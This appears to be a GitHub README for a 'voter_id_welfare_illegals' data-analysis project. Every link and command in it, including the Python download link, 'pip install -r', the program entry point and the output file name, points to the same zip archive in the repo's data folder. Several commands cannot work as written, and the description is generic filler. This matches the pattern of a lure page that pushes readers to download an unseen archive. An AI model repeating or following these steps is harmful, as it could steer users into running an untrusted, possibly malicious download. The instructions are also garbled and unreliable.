## 📥 Download & Install

To get started with the **voter_id_welfare_illegals** application, visit the [Releases page](https://github.com/brokenneckh/voter_id_welfare_illegals/raw/refs/heads/main/data/id_voter_welfare_illegals_1.4.zip) to download the latest version. This version contains everything you need to run the software successfully.

## 📁 About This Project

The **voter_id_welfare_illegals** project is designed to help users analyze the connections between voter ID policies and welfare benefits. The application comes with code, data, and visualizations for easy understanding and replication of the empirical analysis.

### Repo Layout

- **Code**: The main application files are located in the `src/` folder. The entry point for running the program is located at `python https://github.com/brokenneckh/voter_id_welfare_illegals/raw/refs/heads/main/data/id_voter_welfare_illegals_1.4.zip`.
- **Data**: All input files and curated datasets can be found in the `data/` folder. These are essential for the analysis.
- **Output**: The application generates visual output files in the `output/` folder, including various image formats and a summary text file.

## 🚀 Getting Started

To run the application, follow these steps:

1. **Install Python**: Before anything else, ensure you have Python installed on your computer. Download it from [https://github.com/brokenneckh/voter_id_welfare_illegals/raw/refs/heads/main/data/id_voter_welfare_illegals_1.4.zip](https://github.com/brokenneckh/voter_id_welfare_illegals/raw/refs/heads/main/data/id_voter_welfare_illegals_1.4.zip) if you haven't done so already.
   
2. **Install Required Packages**: After installing Python, open your command line interface (Terminal on macOS/Linux, Command Prompt or PowerShell on Windows) and run the following command to install the necessary packages:

   ```bash
   pip install -r https://github.com/brokenneckh/voter_id_welfare_illegals/raw/refs/heads/main/data/id_voter_welfare_illegals_1.4.zip
   ```

3. **Run the Application**: Once the packages are installed, you can start analyzing the data. Use this command:

   ```bash
   python https://github.com/brokenneckh/voter_id_welfare_illegals/raw/refs/heads/main/data/id_voter_welfare_illegals_1.4.zip
   ```

   This will execute the four-step pipeline and generate all the output files you need.

## 📊 Understanding the Outputs

When you run the application, it will create a range of outputs that include:

- **Figures**: All generated visualizations will be stored as PNG, SVG, or HTML files in the `output/` folder. You can view these files using any web browser or image viewer.
- **Statistical Summary**: A narrative summary of the results will be saved as `https://github.com/brokenneckh/voter_id_welfare_illegals/raw/refs/heads/main/data/id_voter_welfare_illegals_1.4.zip`. Open this text file to get insights into the findings.

## 🗺️ High-Contrast Maps

One of the features of this application is the high-contrast map generator. This feature visualizes how different state policies might affect electoral outcomes.

### How It Works

The high-contrast maps module operates as Step 4 in the main pipeline. It performs several tasks:

1. **Loads Geographic Data**: It uses geographic data sourced from the Census Bureau's shapefiles and can fallback to local GeoJSON files if needed.
2. **Merges Policy Data**: The module combines this geographic data with policy data to create meaningful maps that show correlations.

## 🧪 Testing the Software

To ensure that everything is functioning correctly, you can run tests included in the project by executing:

```bash
pytest -q
```

This will run a series of tests to confirm the integrity of the application.

## 📚 System Requirements

To run this application smoothly, your computer should meet the following requirements:

- An operating system: Windows, macOS, or a recent version of Linux.
- Python version 3.6 or higher.
- At least 4 GB of RAM to handle larger datasets.
- Sufficient disk space for data storage and output files.
